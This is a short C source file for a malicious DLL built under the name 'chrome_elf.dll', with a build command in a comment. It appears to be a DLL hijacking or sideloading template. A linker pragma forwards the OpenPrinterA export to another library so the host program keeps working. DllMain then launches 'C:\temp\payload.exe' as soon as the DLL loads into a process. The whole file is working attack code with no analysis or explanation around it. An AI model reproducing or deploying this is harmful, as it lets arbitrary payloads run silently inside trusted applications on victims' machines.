//cl.exe /LD C:\Users\win10\Downloads\elf2.c /link /DLL /OUT:chrome_elf.dll

#pragma comment(linker,"/export:OpenPrinterA=winsplhlp.OpenPrinterA,@143")

//#pragma comment(linker,"/export:NONAME=winsplhlp.#100,@100,NONAME")

#include <Windows.h>


void Go(void) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

    CreateProcess(
        "C:\\temp\\payload.exe",
        "", NULL, NULL, TRUE, 0, NULL, NULL,
        &info, &processInfo);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        Go();
        break;
    case DLL_THREAD_ATTACH:
	break;
    case DLL_THREAD_DETACH:
	break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
